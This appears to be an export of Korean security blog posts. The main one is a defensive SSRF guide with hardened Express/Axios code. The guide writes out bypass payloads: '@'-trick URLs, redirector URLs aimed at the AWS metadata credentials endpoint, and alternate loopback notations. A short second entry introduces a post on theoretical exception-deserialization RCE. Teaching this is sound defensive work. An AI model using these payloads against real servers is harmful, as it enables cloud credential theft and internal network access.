[{"content":" 은탄환은 없다: 민속과 현대적 의미\n“은탄환(no silver bullet)”이라는 표현은 유럽 민속에서 유래했으며, 은으로 만든 탄환만이 늑대인간이나 뱀파이어 같은 초자연적 존재를 물리칠 수 있다고 믿었습니다. 1816년 월터 스콧의 _Tales of My Landlord_에서 처음 문서화되었고, 1765년의 제보당의 야수 사건 등에서도 마지막 수단으로 은탄환이 언급됩니다. 시간이 흐르며 이 표현은 “복잡한 문제에 단 하나의 간단한 해결책은 없다”는 의미로 확장되었고, 소프트웨어 공학에서는 프레드 브룩스의 1986년 에세이로 널리 알려졌습니다. 이 글은 SSRF 방어에도 같은 교훈을 적용합니다: 만능 해결책에 의존하지 말고, 단순한 속설이나 임시방편이 아닌, 근본적인 원인과 구조적 대책을 고민해야 합니다.\n“안전한” SSRF 패치의 한계: 고급 우회와 다계층 방어 전략 인트로: SSRF란 무엇이고, 왜 위험한가? 서버사이드 요청 위조(SSRF)는 공격자가 서버로 하여금 의도하지 않은 위치로 HTTP 요청을 보내도록 속이는 취약점입니다. 일반적인 SSRF 공격에서 공격자는 서버 코드가 가져올 URL이나 주소를 입력하지만, 예상한 외부 리소스 대신 서버가 내부 서비스나 보호된 엔드포인트에 접근하게 만듭니다. 이로 인해 공격자는 내부 네트워크를 스캔하거나, 데이터베이스 엔드포인트에 접근하거나, AWS EC2 토큰과 같은 클라우드 인스턴스 메타데이터를 탈취할 수 있습니다. 이러한 위험성 때문에 SSRF는 OWASP Top 10(2021)에 포함되어 있으며, 개발자들에게 점점 더 큰 위협이 되고 있습니다.\n“그냥 startsWith('https://trusted.com')만 쓰면 SSRF 막을 수 있어요!”\n— StackOverflow에서 자주 보이는(하지만 실패하는) 조언\n이처럼 SSRF의 위험성 때문에 많은 개발자들은 빠른 패치 방법에 의존합니다. 하지만 위 인용구에서 보듯, 선의의 조언이 오히려 불완전하거나 우회 가능한 방어로 이어지는 경우가 많습니다. 온라인에는 URL 필터링, 도메인 허용 리스트 등으로 SSRF를 “해결”했다고 주장하는 코드와 답변이 넘쳐나지만, 실제로는 고급 우회 기법에 취약한 경우가 대부분입니다.\n이 글에서 다루는 내용:\n“안전한” SSRF 패치가 실전에서 왜 자주 실패하는지 공격자가 창의적인 페이로드로 어떻게 방어를 우회하는지 Node.js(Express + Axios) 환경에서 실전적이고 계층적인 SSRF 방어 구현법 실습 가능한 SSRF Defense Lab과 테스트 전략 글을 끝까지 읽으면, 불완전한 SSRF 패치를 구별하고, 고급 우회 기법을 이해하며, 실제 공격에도 견디는 다계층 방어 전략을 직접 구현할 수 있게 됩니다. 보안은 반복적 테스트와 지속적 강화가 필요하지만, 올바른 접근법을 익힌다면 공격자보다 한발 앞서 나갈 수 있습니다.\n흔히 쓰이는 SSRF 패치 방법과 그 한계 SSRF 취약점을 빠르게 막으려는 개발자들은 겉보기에 효과적으로 보이는 간단한 패턴을 자주 적용합니다. 대표적인 SSRF 방어 패턴은 다음과 같습니다:\nURL 접두어나 호스트명 일부로 허용 리스트 구성 – 예: 특정 도메인으로 시작하는 URL만 허용 기본적인 호스트네임 검증 – 예: 입력받은 URL을 파싱해 호스트네임이 기대값과 일치하는지 확인 문자열로 사설 IP 차단 – 예: 127.0.0.1이나 localhost가 포함된 URL 거부 스킴 필터링 – 예: http:// 또는 https://만 허용, FTP나 file 등은 차단 리다이렉트 미허용 – 실제로는 강제하지 않고 “안 따라간다”고 가정하는 경우도 많음 악의적 패턴에 대한 피상적 체크 – 예: file://이 포함된 URL 차단, 16진수/인코딩된 IP 탐지 시도 등 이론적으로는 그럴듯해 보이지만, 공격자들은 이런 필터를 우회할 수 있는 다양한 트릭을 개발해왔습니다. 몇 가지 대표적인 허술한 SSRF 방어의 함정과 실제 우회 사례를 살펴보겠습니다:\n1. 접두어 매칭 기반의 허술한 도메인 허용 리스트 가장 흔한 방식은 특정 신뢰 도메인 또는 베이스 URL로만 요청을 허용하는 것입니다. 예를 들어 아래와 같은 코드가 있을 수 있습니다:\n// ❌ 취약한 SSRF 체크 (접두어 기반 허용 리스트) if (!userUrl.startsWith(allowedBaseUrl)) { throw new Error(\u0026#34;URL not allowed\u0026#34;); } 겉보기에 단순합니다. 사용자가 입력한 URL이 https://trusted.example.com으로 시작하지 않으면 차단합니다. 문제는: URL 문자열 매칭은 교묘한 포맷 변형에 쉽게 속을 수 있다는 점입니다. 공격자들은 @ 표기법을 활용해 이런 체크를 우회합니다. HTTP URL에서 @ 앞은 인증(userinfo) 정보로 간주되고, 실제 호스트는 @ 뒤입니다. 예시:\n정상 URL: https://trusted.example.com/path/file.txt 공격 URL(@ 활용): https://trusted.example.com@evil.attacker-site.com/path/file.txt 겉으로 보면 공격 URL도 https://trusted.example.com으로 시작하므로 startsWith() 체크를 통과합니다. 실제로는 호스트네임이 evil.attacker-site.com이 되어 서버가 공격자 도메인에 요청을 보냅니다. 즉, SSRF 우회 성공입니다.\n실제 사례: 오픈소스 ChatGPT-Next-Web 프로젝트도 API 엔드포인트에 접두어 기반 허용 리스트를 적용한 SSRF 패치를 썼다가 뚫렸습니다. 입력 URL이 허용된 호스트 접두어(예: 신뢰 WebDAV 서비스 URL)로 시작하는지만 검사했는데, 코드가 도메인 뒤 구분자를 강제하지 않아 공격자가 허용 접두어 뒤에 임의 문자열을 붙여 악의적 도메인으로 만들 수 있었습니다. 예를 들어, https://webdav.yandex.com이 허용된 경우 공격자는 https://webdav.yandex.com.attacker.tld/evil을 제출해 .startsWith()를 통과시키고 실제로는 attacker.tld로 요청을 보냈습니다. 이런 단순 접두어 체크는 악의적 호스트명에 신뢰 문자열을 포함시키는 것만으로 손쉽게 우회됩니다.\n2. 얕은 호스트네임 검증과 서브도메인 트릭 조금 더 나은 방법은 URL을 실제로 파싱해서 호스트네임을 확인하는 것입니다. 예를 들어 Node의 url.parse()나 WHATWG URL API로 호스트네임을 추출해 허용 리스트와 비교할 수 있습니다:\nconst parsed = new URL(userUrl); if (parsed.hostname !== \u0026#34;trusted.example.com\u0026#34;) { throw new Error(\u0026#34;Hostname not allowed\u0026#34;); } 이렇게 하면 @ 문제는 해결됩니다. https://trusted.example.com@evil.com의 경우 parsed.hostname은 evil.com이기 때문입니다. 하지만 호스트네임 문자열 비교에도 허점이 있습니다. 서브도메인, 유사 도메인 문제입니다. 특정 호스트만 허용하려면 정확히 일치하는지(또는 엄격한 패턴)를 체크해야 합니다. 공격자는 허용 문자열을 포함한 도메인을 등록할 수 있습니다. 예시:\n허용 호스트: api.mycompany.com 공격자 등록: api.mycompany.com.evil.org (evil.org의 서브도메인) endsWith(\u0026quot;api.mycompany.com\u0026quot;)이나 문자열 포함 체크만 하면 속을 수 있습니다. .mycompany.com 체크도 really-trusted.mycompany.com.evil.org 같은 도메인에 우회당할 수 있습니다. 위 ChatGPT-Next-Web 사례가 서브도메인 접두어 악용의 대표적 예입니다. 호스트 검증을 반드시 앵커링(전체 일치 또는 엄격한 패턴)해야 하며, 서브도메인을 허용한다면 *.example.com처럼 점(.) 경계까지 고려해야 합니다(example.com.evil.com은 절대 허용 X).\n또 한 가지 자주 간과되는 점이 DNS 해석입니다. URL의 호스트네임이 멀쩡해 보여도 실제로 기대한 IP로 해석되는지 보장할 수 없습니다. DNS rebinding 공격에서는 공격자가 도메인을 소유하고 DNS 응답을 조작할 수 있습니다. 서버가 parsed.hostname을 허용 리스트와 비교해도, 예를 들어 외부 호스트만 허용하는 필터라면 공격자 도메인이 1차 검증 때는 정상(public IP)으로, 실제 요청 때는 사설 IP(127.0.0.1 등)로 응답하게 만들 수 있습니다. 즉, DNS 해석 결과를 반드시 한 번만 얻어 그 IP를 검증하고, 가능하다면 그 IP로 직접 요청을 보내야 합니다. 여러 번 연결이 필요하다면 매번 검증해야 합니다.\n마지막으로 대체 IP 표기법도 주의하세요. 코드에서 127.0.0.1이나 localhost만 막으면 공격자는 2130706433(10진수, 0x7F000001), IPv6 루프백 ::1 등으로 우회할 수 있습니다. 견고한 방어는 반드시 주소를 정규화해 검증해야 하며, IP 문자열 매칭에만 의존해선 안 됩니다.\n3. 불충분한 리다이렉트 처리 HTTP 리다이렉트는 이를 고려하지 않은 SSRF 필터를 완전히 무력화할 수 있습니다. 대부분의 HTTP 클라이언트(Axios, requests 등)는 기본적으로 리다이렉트를 자동으로 따라갑니다. 즉, 백엔드가 301/302 응답을 받으면 클라이언트가 새 위치로 투명하게 요청을 보냅니다. SSRF 방어가 초기 URL만 검사한다면, 공격자는 중간 사이트를 경유해 손쉽게 우회할 수 있습니다.\n예를 들어, 앱에서 https://cdn.safe-files.com만 다운로드 허용한다고 가정합시다. 공격자는 해당 CDN(또는 허용 도메인)에 오픈 리다이렉트 취약점이 있거나, 302.r3dir.me 같은 SSRF 테스트용 리다이렉트 서비스를 사용합니다. 공격자는 허용 도메인으로 요청을 보내면 바로 악의적/내부 주소로 리다이렉트되도록 만듭니다. 코드는 요청 URL에 허용 도메인이 있으니 통과시키지만, 서버는 리다이렉트를 따라가 금지된 대상에 도달합니다. 결국 서버가 내부 자원에 요청을 보내 SSRF가 성공합니다.\n실전 예시로 302.r3dir.me 서비스를 활용할 수 있습니다. 이 서비스는 URL 쿼리에 지정된 대상으로 리다이렉트해 SSRF 테스트를 도와줍니다. 예를 들어, 타깃이 AWS EC2 메타데이터 URL http://169.254.169.254/latest/meta-data/iam/security-credentials/라면, 공격자는 다음과 같이 요청할 수 있습니다:\nhttps://your-allowed-cdn.com@302.r3dir.me/--to/?url=http://169.254.169.254/latest/meta-data/iam/ 이 URL은 @ 트릭(접두어 체크 우회)과 내부 AWS 메타데이터로의 리다이렉트를 모두 포함합니다. 서버가 이를 따라가면 응답으로 AWS 자격증명이 노출됩니다! 실제 테스트에서는 https://cdn.example.com@302.r3dir.me/--to/?url=http://intranet.com/과 같은 페이로드로 리다이렉트 기반 우회를 시뮬레이션합니다. 적절한 방어가 없다면 이런 요청이 허용 리스트를 뚫고 최종 타깃에 도달할 수 있습니다. 실제로 302.r3dir.me(또는 유사 리다이렉트 서버)를 활용해 허술한 SSRF 방어를 우회, 내부 네트워크와 메타데이터 엔드포인트에 접근한 사례가 다수 보고되었습니다.\n더 나쁜 점은 스킴(프로토콜) 강제도 리다이렉트로 우회될 수 있다는 것입니다. 일부 개발자는 보안을 위해 https://만 허용하지만, 리다이렉트를 제어하지 않으면 공격자가 처음에는 https://로 시작해도 이후 http://로 바꿀 수 있습니다. 대부분의 HTTP 라이브러리는 HTTPS→HTTP 리다이렉트를 별다른 설정 없이 따라갑니다. Leviathan Security의 연구처럼, 이 트릭으로 공격자는 결국 내부 HTTP 서비스(많은 백엔드/클라우드 메타데이터 엔드포인트가 HTTP 사용)에 도달할 수 있습니다. 리다이렉트 제한이 없다면 “HTTPS만 허용” 규칙은 첫 홉에만 적용되고, 이후는 무방비입니다.\n4. 기타 고급 우회 기법 접두어, 서브도메인, 리다이렉트 외에도 SSRF 필터를 우회하는 창의적 방법이 많습니다:\nIP/도메인 혼합 포맷: 일부 브라우저/클라이언트는 http://127.0.0.1.xip.io나 http://[::ffff:127.0.0.1] 같은 URL을 허용합니다. 호스트네임이나 IPv6처럼 보이지만 실제로는 IPv4 루프백입니다. 필터가 “127.0.0.1”만 막으면 이런 우회가 가능합니다. HTTP 헤더 인젝션(드묾): 아주 드물지만, 사용자 입력이 HTTP 요청에 직접 연결될 때 공격자가 헤더 구분자를 삽입해 요청을 변조할 수 있습니다. SSRF 우회라기보다는 입력 파싱 취약점이지만, 반드시 라이브러리로 요청을 생성해야 함을 상기시킵니다. 대체 스킴(Gopher, File): 대부분의 SSRF 패치는 HTTP/HTTPS만 신경쓰지만, 요청 함수가 다른 스킴을 지원하면 공격자가 file://로 파일을 읽거나 gopher://로 내부 서비스에 접근할 수 있습니다. 과거 SSRF 공격의 상당수는 gopher로 memcached 등 내부 서비스에 접근한 사례입니다. 반드시 의도한 프로토콜만 허용해야 하며, 보통 웹앱이라면 HTTP/HTTPS만 허용해야 합니다. 요약하면, 온라인에 떠도는 “간단한” SSRF 패치들은 이런 예외 케이스를 전혀 고려하지 않습니다. 눈에 띄는 악성 URL만 막고, 창의적인 공격자에겐 여전히 뚫릴 수 있습니다. 개발자는 방어 로직을 설계할 때 공격자처럼 생각해야 합니다. 다음으로, Node.js 예제를 통해 더 견고한 SSRF 방어를 단계별로 구현하는 방법을 살펴보겠습니다.\n견고한 SSRF 방어 구축하기 (Node.js 예제) SSRF를 제대로 막으려면 단일 체크만으로는 부족합니다. 요청 URL을 여러 계층에서 검증하고, 안전한 라이브러리 기능을 적극 활용해야 실수를 줄일 수 있습니다. 위에서 살펴본 교훈을 바탕으로, Node.js(Express + Axios) 환경에서 강화된 SSRF 방어법을 단계별로 구현해봅니다.\n아래는 특정 CDN 도메인에서만 파일 다운로드를 허용하는 안전한 엔드포인트 예시입니다. URL 파싱, 허용 리스트, 인터셉터, 엄격한 요청 옵션 등으로 SSRF를 방지합니다:\nimport axios from \u0026#34;axios\u0026#34;; import { URL } from \u0026#34;url\u0026#34;; import express from \u0026#34;express\u0026#34;; const R = express.Router(); const ALLOWED_HOSTS = [\u0026#34;cdn.example.com\u0026#34;]; // 허용된 호스트명 // 짧은 타임아웃으로 Axios 인스턴스 생성 const downloader = axios.create({ timeout: 10000 }); // URL 정책을 강제하는 요청 인터셉터 등록 downloader.interceptors.request.use(config =\u0026gt; { const u = new URL(config.url, config.baseURL); // HTTPS 프로토콜 및 허용 호스트만 허용 if (u.protocol !== \u0026#34;https:\u0026#34; || !ALLOWED_HOSTS.includes(u.hostname)) { return Promise.reject(new Error(`Blocked hostname: ${u.hostname}`)); } return config; }); R.get(\u0026#34;/file-proxy/download\u0026#34;, async (req, res) =\u0026gt; { const url = req.query.url; const fname = req.query.file_name; if (!url || !fname) { return res.status(400).send(\u0026#34;Missing parameters\u0026#34;); } try { const resp = await downloader.get(url, { responseType: \u0026#34;stream\u0026#34;, maxRedirects: 0, // 리다이렉트 허용 안 함 //validateStatus: status =\u0026gt; status \u0026lt; 400 // 3xx도 직접 처리하도록 설정 가능 }); // 다운로드 헤더 설정 res.setHeader(\u0026#34;Content-Disposition\u0026#34;, `attachment; filename=${encodeURIComponent(fname)}`); res.setHeader(\u0026#34;Content-Type\u0026#34;, resp.headers[\u0026#34;content-type\u0026#34;] || \u0026#34;application/octet-stream\u0026#34;); // 응답 스트림을 바로 클라이언트로 전달 resp.data.pipe(res); } catch (e) { console.error(\u0026#34;Blocked or failed download:\u0026#34;, e.message); res.status(400).send(\u0026#34;Invalid or forbidden URL\u0026#34;); } }); 이 구현이 앞서 소개한 우회 기법들을 어떻게 막는지 하나씩 살펴봅니다:\nURL 파싱 및 호스트 허용 리스트: Node의 표준 URL 생성자를 사용해 요청 URL을 파싱합니다(new URL(config.url)). 이를 통해 URL의 각 컴포넌트를 정확히 식별할 수 있습니다. u.protocol과 u.hostname을 체크해 교묘한 포맷 변형도 방지합니다. 예를 들어, https://cdn.cloudfront.net@evil.com/...의 u.hostname은 evil.com이므로 인터셉터가 차단합니다. 오직 ALLOWED_HOSTS에 명시된 호스트만 허용합니다. 공격자가 유사 도메인이나 서브도메인을 시도해도 모두 차단됩니다.\nHTTPS만 허용: 인터셉터에서 u.protocol !== \u0026quot;https:\u0026quot;를 검사해 HTTPS가 아닌 경우(다운그레이드 공격, file:// 등) 즉시 차단합니다. 단, 이 자체만으로는 HTTPS→HTTP 리다이렉트 우회를 막을 수 없으므로, 아래처럼 리다이렉트도 차단해야 합니다.\n리다이렉트 완전 차단: maxRedirects: 0 옵션으로 Axios가 어떤 리다이렉트도 따라가지 않게 만듭니다. 302 등 리다이렉트 응답이 오면 바로 반환하고, 직접 처리합니다. (코드에서 3xx를 에러로 간주하도록 추가 옵션도 가능) 이렇게 하면 허용 호스트가 리다이렉트로 악성 주소로 넘기려 해도, 서버가 따라가지 않고 400 에러로 차단합니다. 예를 들어 cdn.example.com이 evil.com으로 리다이렉트하면, 서버는 이를 따르지 않고 바로 차단합니다. 참고: 만약 제한된 횟수의 리다이렉트만 허용하고 싶다면, 각 홉마다 검증이 필요하므로 복잡해집니다. 사용자 입력 URL엔 리다이렉트 자체를 아예 금지하는 것이 가장 안전합니다.\n인터셉터를 통한 중앙 집중 정책 적용: Axios 요청 인터셉터를 활용해, 해당 인스턴스의 모든 요청에 정책이 일관되게 적용됩니다. 검증 로직을 여기저기 흩뿌리지 않아도 되고, 개발자가 매번 직접 검증 함수를 호출하지 않아도 됩니다. 코드 차원에서의 defense-in-depth(다계층 방어) 역할도 하며, 실수로 검증을 빼먹어도 인터셉터가 최종적으로 막아줍니다.\n타임아웃 및 에러 처리: SSRF 우회와 직접적 관련은 없지만, 느리거나 응답 없는 엔드포인트로 인한 서비스 지연을 막으려면 적절한 타임아웃(여기선 10초)을 설정하는 것이 좋습니다. 또한, 에러가 발생하면(인터셉터/요청 모두) 400 응답과 함께 에러 로그를 남깁니다. 에러 메시지는 “Blocked hostname: evil.com”처럼, 차단 원인을 로깅해 공격 탐지에 활용할 수 있습니다(단, 너무 상세한 정보를 사용자에게 노출하진 않도록 주의).\n컨텐츠 검증: 위 예제는 정상 응답 후, 파일을 다운로드(attachment; filename=...)로 바로 전달합니다. 허용된 소스의 컨텐츠를 신뢰하는 경우입니다. 만약 파일 유형, 크기 등 추가 검증이 필요하다면(예: PDF만 허용, 특정 용량 제한 등), 파이프 전 체크를 추가하면 됩니다. 여기서는 SSRF 방어에 초점을 맞췄습니다.\n이렇게 구현하면, 앞서 우회에 성공했던 테스트 케이스도 모두 안전하게 통과합니다. startsWith 기반 필터는 @와 오픈 리다이렉트에 뚫렸지만, 새 구현은 진짜 호스트만 체크하고 리다이렉트도 아예 차단하므로 우회가 불가능합니다. 실제 테스트 예시:\n허용 도메인 정상 요청: 허용된 CDN으로의 정상 요청은 200 OK로 성공 @ 리다이렉트 페이로드 차단: ...cloudfront.net@302.r3dir.me/...는 400 에러와 함께 로그에 남음(인터셉터가 hostname = 302.r3dir.me로 감지) 외부 도메인 직접 접근 차단: https://evil.com/...은 허용 리스트 미포함으로 즉시 차단 허용 호스트의 리다이렉트 차단: CDN이 리다이렉트 응답(테스트에선 nock으로 302 시뮬레이션)해도 서버가 따라가지 않고 400 반환 이처럼 URL 파싱과 HTTP 클라이언트 레벨의 정책 강제로 SSRF 위험을 크게 줄일 수 있습니다. 하지만 이걸로 끝이 아닙니다. 진짜 안전한 SSRF 방어는 여러 계층의 체크가 결합되어야만 가능합니다.\n다계층 방어: 추가적인 보안 대책 위에서 소개한 코드 레벨의 보호 조치만으로도 강력한 출발점이 될 수 있습니다. 하지만 숙련된 공격자는 특히 복잡한 실제 환경에서 여전히 빈틈을 노릴 수 있습니다. 다음은 여러분(그리고 보안팀)이 반드시 고려해야 할 추가적인 다계층(Defense-in-Depth) 보안 대책입니다:\nDNS 해석 및 IP 대역 검증: 호스트네임 허용 리스트만으로는 충분하지 않을 수 있으므로, 해당 도메인이 실제로 어디로 해석되는지 한 번 더 확인하는 것이 좋습니다. 예를 들어, 허용된 호스트의 IP 주소가 예상한 대역(예: 공인 IP)에 속하는지 반드시 검증하세요. 클라우드 환경에서는 일부 호스트네임이 내부 IP로 해석될 수 있으니 특히 주의해야 합니다. 요청 전에 DNS 조회를 수행하고, 결과 IP가 사설/내부 주소(RFC1918 대역, localhost, link-local 등)가 아닌지 확인하세요. 이렇게 하면 허용 도메인이 탈취되거나 DNS rebinding으로 서버가 내부망을 공격하는 시나리오를 막을 수 있습니다. 대부분의 언어에는 IP가 사설 네트워크에 속하는지 검사하는 라이브러리(예: Python의 ipaddress 모듈, Golang의 net 패키지 등)가 있습니다. Node.js에서는 dns.promises.lookup으로 IP를 얻어 검사할 수 있습니다. 조회와 실제 요청 사이에 레이스 컨디션이 발생하지 않도록 주의하며, 위 인터셉터 방식을 커스텀 DNS 리졸버와 결합해 IP 필터링을 강화할 수도 있습니다.\n네트워크 이그레스 필터링(CIDR 허용/차단 목록): SSRF 방어를 애플리케이션 코드에만 의존하지 마세요. 네트워크 레벨의 제어가 추가적인 안전망이 될 수 있습니다. 예를 들어, 서비스가 특정 외부 API나 CDN에만 접근해야 한다면, 방화벽 규칙이나 클라우드 보안 그룹을 설정해 그 외 모든 아웃바운드 요청을 차단하세요. 대부분의 클라우드 제공자나 컨테이너 오케스트레이션 플랫폼은 이그레스(외부로 나가는 트래픽) 제한 기능을 제공합니다. 웹 애플리케이션 방화벽(WAF)이나 API 게이트웨이에서도 내부 IP 대역으로의 트래픽을 차단하는 규칙을 추가해, 애플리케이션 로직을 넘어선 또 다른 방어 계층을 구축할 수 있습니다.\n허용 포트 및 프로토콜 제한: 만약 서비스가 표준 HTTP/S 포트만 사용한다면, 허용 포트를 명확히 제한하는 것이 좋습니다. SSRF 공격자는 비HTTP 서비스(예: http://target:22/로 SSH 배너 확인, 또는 포트 스캐닝 등)를 노릴 수 있습니다. HTTP 클라이언트가 해당 프로토콜을 직접 처리하지 않더라도, 단순 연결만으로도 정보가 노출될 수 있습니다. 허용 리스트 정책에서 80/443 외의 포트를 차단하거나, 프레임워크 URL 파서에서 u.port 값을 검사(예: https/http일 때 443/80 또는 빈 값만 허용)하는 식으로 제한할 수 있습니다. 마찬가지로, http와 https 이외의 스킴(ftp:, file: 등)은 절대 허용하지 않도록 하세요.\n로깅 및 알림: SSRF 시도와 관련된 로그는 반드시 고위험 이벤트로 취급해야 합니다. 위 코드에서는 다운로드가 차단될 때 console.error로 로깅하지만, 실제 운영 환경에서는 이런 로그를 모니터링 시스템으로 전송하는 것이 좋습니다. 예를 들어 “Blocked hostname: 169.254.169.254”와 같은 메시지가 반복된다면, 누군가 SSRF 취약점을 탐색 중임을 나타내는 강력한 신호입니다. 이런 패턴에 대해 경고 알림을 설정하세요. 요청 URL(또는 최소한 도메인)이 포함된 상세 접근 로그는 사고 대응 시 공격자가 어떤 시도를 했는지 추적하는 데 큰 도움이 됩니다. SSRF 공격은 때로 “블라인드” 방식(공격자가 직접 응답을 받지 않음)일 수 있으므로, 공격자가 엔드포인트를 퍼징하고 부수 효과를 관찰할 수도 있습니다. 이럴 때는 꼼꼼한 로깅이 문제가 있다는 유일한 단서가 될 수 있습니다.\n보안 테스트 및 자동화: SSRF 필터를 우회하는 방법이 워낙 다양하므로, 지속적인 테스트가 필수입니다. SSRF 테스트 케이스를 QA나 CI/CD 파이프라인에 통합하세요. 예를 들어, 앞서 소개한 테스트 스위트는 @ 페이로드와 오픈 리다이렉트 시나리오를 자동으로 시도해 서버가 400을 반환하는지 확인합니다. 보안 스캐닝 도구를 활용하거나, 검증 로직에 대한 단위 테스트를 직접 작성할 수도 있습니다. 정적 분석도 도움이 됩니다—예를 들어 Semgrep이나 CodeQL 쿼리로 위험한 패턴(검증 없는 axios.get(userInput) 등)을 탐지할 수 있습니다. 조직 차원에서는 정기적인 모의 해킹(침투 테스트)도 병행해야 합니다. Burp Suite 같은 도구는 SSRF 페이로드 목록을 제공하며, 다양한 변형(인코딩된 IP 등)을 자동으로 시도할 수 있습니다. 여러분의 “안전하다”는 코드가 실제로 이런 공격에 견딜 수 있는지 꼭 검증하세요.\n의존성 및 보안 지식 최신화: SSRF 관련 생태계는 계속 진화하고 있습니다. 새로운 우회 기법(예: 언어별 URL 파싱 취약점, 클라우드 메타데이터 서비스의 특이 동작 등)이 지속적으로 발견됩니다. 보안 권고에 항상 귀 기울이세요—예를 들어, SSRF 방어를 위해 만들어진 nossrf npm 패키지조차도 치명적 우회 취약점이 발견된 바 있습니다. URL 요청과 관련된 라이브러리나 패키지는 항상 최신 패치 버전을 사용하고, 보안 패치 내역(Changelog)을 꼼꼼히 확인하세요. 그리고 절대 HTTP 클라이언트의 인증서 검증 등 핵심 보호 기능을 비활성화하지 마세요—이렇게 하면 공격자가 “안전한” 요청을 가로채거나 가짜 인증서를 제시할 수 있습니다.\n요약하면, 다계층 방어란 한 단계의 방어가 실패할 수 있음을 전제로 여러 겹의 방어책을 두는 것입니다. 단순 접두사 검사만으로는 우회가 가능했지만, 코드에서 호스트명·프로토콜·리다이렉트 제어를 결합하니 우회가 훨씬 어려워졌습니다. 여기에 네트워크 규칙과 지속적인 테스트까지 더하면 공격자가 뚫고 들어오기 훨씬 더 힘들어집니다. 공격자가 넘어야 할 장애물이 많아질수록, 포기하거나 실수로 탐지될 확률도 높아집니다.\n결론: “만능 SSRF 패치”는 없다 은탄환(Silver Bullet)은 없습니다.\n전설에도, 보안에도 없습니다. 보안은 한 줄짜리 공식이 아니라, 생각하고, 테스트하고, 뚫리고, 고치고, 반복하는 과정입니다.\nSSRF 취약점은 소프트웨어 보안의 더 큰 교훈을 줍니다: 만능 패치에 속지 마세요. “이 코드 한 줄이면 SSRF가 해결된다”는 식의 조각 코드가 있다면 반드시 의심하세요. 실제로 널리 쓰이는 “안전한” 패치조차도(예: ChatGPT-Next-Web의 초기 수정, 단순 허용 리스트 등) @ 우회나 리다이렉트 트릭에 뚫릴 수 있었습니다. 공격자는 항상 정해진 틀 밖에서 생각하므로, 우리의 방어도 그 이상이어야 합니다.\nSSRF Defense Lab: 실전 테스트베드 실제로 내 SSRF 방어책이 통하는지 검증하고 싶으신가요? 오픈소스 SSRF Defense Lab 프로젝트를 활용해보세요:\n🧪 SSRF 보안을 위한 최소·자급형 Node.js/Express 테스트베드 🔧 실제 우회 사례가 포함된 안전/취약 라우터 예제 🛠️ CDN/도메인 허용 리스트, 리다이렉트 우회 등 자동화된 테스트 유틸리티 📋 모든 테스트를 통과해야만 안전한 라우터로 간주 주요 특징:\n재사용 가능한 SSRF 보안 테스트 유틸리티 안전/취약 라우터 코드와 테스트 흔한 우회 기법(@ 트릭, 오픈 리다이렉트, 비허용 도메인 등) 모두 커버 실행도 간단: npm install \u0026amp;\u0026amp; npm test 소스 및 문서: github.com/windshock/ssrf-defense-lab\n개발자 및 보안 담당자를 위한 핵심 요약:\n핵심 요약 사용자가 제어하는 URL은 항상 엄격히 검증·정제하세요. 문자열 비교 대신 검증된 라이브러리로 파싱하세요. 방어를 계층화하세요. 호스트 허용 리스트, 프로토콜 검사, DNS/IP 검증, 리다이렉트 엄격 처리 등을 조합하세요. 공격자처럼 테스트하세요. 실제 우회 페이로드와 자동화된 테스트로 본인 방어책을 스스로 뚫어보세요. 다계층(Defense-in-Depth) 전략을 채택하세요. 애플리케이션 로직과 네트워크 레이어 통제를 모두 활용해 위험을 줄이고, 악용 시도를 모니터링하세요. 새로운 우회 기법에 항상 대비하세요. 보안은 끝이 없습니다—계속 배우고, 업데이트하고, 적응하세요. SSRF 방어는 단일 패치로 끝나는 문제가 아닙니다. 견고하고 계층적인 방어를 구축하고, 방심하지 않는 것이 핵심입니다. 주기적으로 리뷰·테스트·도전하며 솔루션을 점검하세요. 여러분이 하지 않으면, 누군가는 반드시 시도할 것입니다. 보안은 설계 단계부터, 그리고 매번의 경험을 통해 더욱 단단해집니다.\n참고 자료 Bypassing SSRF Filters Using r3dir — Leviathan Security Server-side request forgery (Wikipedia) Silver Bullet – Archive.org Snyk Blog: Preventing SSRF in Node.js GitHub Patch (NextChat) NextChat SSRF Advisory (GitHub) SSRF Defense Lab (GitHub) ","permalink":"http://localhost:1313/ko/post/2025-06-25-ssrf-defense/","summary":"\u003cblockquote\u003e\n\u003cp\u003e\u003cstrong\u003e은탄환은 없다: 민속과 현대적 의미\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e“은탄환(no silver bullet)”이라는 표현은 유럽 민속에서 유래했으며, 은으로 만든 탄환만이 늑대인간이나 뱀파이어 같은 초자연적 존재를 물리칠 수 있다고 믿었습니다. 1816년 월터 스콧의 _Tales of My Landlord_에서 처음 문서화되었고, 1765년의 제보당의 야수 사건 등에서도 마지막 수단으로 은탄환이 언급됩니다. 시간이 흐르며 이 표현은 “복잡한 문제에 단 하나의 간단한 해결책은 없다”는 의미로 확장되었고, 소프트웨어 공학에서는 프레드 브룩스의 1986년 에세이로 널리 알려졌습니다. 이 글은 SSRF 방어에도 같은 교훈을 적용합니다: 만능 해결책에 의존하지 말고, 단순한 속설이나 임시방편이 아닌, 근본적인 원인과 구조적 대책을 고민해야 합니다.\u003c/p\u003e","title":"SSRF Defense: 최신 방어 전략과 실전 가이드"},{"content":"작성자: 이형관 (Hyeongkwan Lee)\n이메일: windshock@gmail.com\nGitHub: https://github.com/windshock\nLinkedIn: https://www.linkedin.com/in/windshock/\n블로그: https://windshock.github.io\nXML-RPC 보안 시리즈\n시리즈 1 - XML-RPC 보안 취약점 분석 및 대응 전략 시리즈 2 - CVE-2019-17570: Apache XML-RPC Exploit 시리즈 3 - OpenStack Nova 예외 직렬화 패턴: 이론적 RCE 위험과 보안 교훈 개요 이 보고서는 OpenStack Nova에서 oslo.messaging 라이브러리를 사용할 때 발생할 수 있는 예외 직렬화/역직렬화 기반의 이론적 원격 코드 실행(RCE) 위험을 분석합니다.\n실제 환경에서 RCE가 쉽게 발생한다는 주장이 아니라, 보안 담당자와 개발자가 위험한 예외 처리 패턴(anti-pattern)을 인지하고 학습할 수 있도록 돕는 것이 목적입니다.\n실제 OpenStack 환경에서는 모듈 화이트리스트, 메시지 브로커 격리, 안전한 로깅 등 여러 방어장치가 적용되어 있어 실질적 공격 가능성은 매우 낮습니다.\n아래의 PoC(Proof-of-Concept) 시나리오들은 교육적 목적의 예시로, 방어장치가 모두 해제된 비현실적 환경을 가정합니다.\n핵심 요약 예외 직렬화/역직렬화 과정에서, 신뢰할 수 없는 예외 객체가 포맷팅될 때 위험이 발생할 수 있음 실제 OpenStack 환경에서는 여러 방어장치로 인해 실질적 RCE 발생 가능성은 극히 낮음 PoC 코드 및 위험 패턴을 통해, 실무에서 반드시 피해야 할 예외 처리 방식(anti-pattern)을 명확히 제시 